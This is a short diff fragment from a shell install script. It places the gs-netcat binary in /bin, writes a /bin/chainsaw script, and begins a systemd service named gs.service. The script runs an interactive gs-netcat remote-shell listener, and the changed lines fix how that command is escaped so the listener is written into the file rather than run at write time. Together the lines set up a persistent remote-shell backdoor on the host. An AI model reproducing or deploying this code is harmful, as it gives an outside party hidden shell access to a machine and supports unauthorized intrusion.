@@ -35,10 +35,7 @@ chmod +x /tmp/gs-netcat
 rm /tmp/gs-netcat.tar.gz
 mv /tmp/gs-netcat /bin/gs-netcat
 
-cat << EOF > /bin/chainsaw
-$(gs-netcat -li -s $machine -q)
-EOF
-
+echo "\$(gs-netcat -li -s $machine -q)" > /bin/chainsaw
 chmod +x chainsaw
 
 cat << EOF > /etc/systemd/system/gs.service
